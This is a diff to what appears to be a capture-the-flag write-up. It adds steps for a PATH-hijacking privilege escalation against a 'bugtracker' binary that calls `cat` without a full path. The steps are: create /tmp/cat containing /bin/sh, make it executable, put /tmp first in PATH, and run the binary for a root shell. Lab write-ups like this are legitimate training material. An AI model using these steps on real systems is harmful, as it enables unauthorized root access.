@@ -196,6 +196,18 @@ Provide Bug ID: 12
 cat: /root/reports/12: No such file or directory
 ```
 
+**Vulnerability:** It only uses `cat` (without the full path to the executable). 
+- Navigate to the `/tmp` directory and create a file named `cat` with the following content: `/bin/sh`
+- Make sure to `chmod` that file so it's executable.
+
+**Exploit:** Add the /tmp directory to the PATH environmental variable.
+- Command: `export PATH=/tmp:$PATH`
+- Check: `echo $PATH`
+- Result: `\tmp` is first so it will be searched first for commands w/o a path provided.
+```
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+- Run the bugtracker, input whatever you want, and it should execute our `/tmp/cat` and give us a root shell.
 
 
 
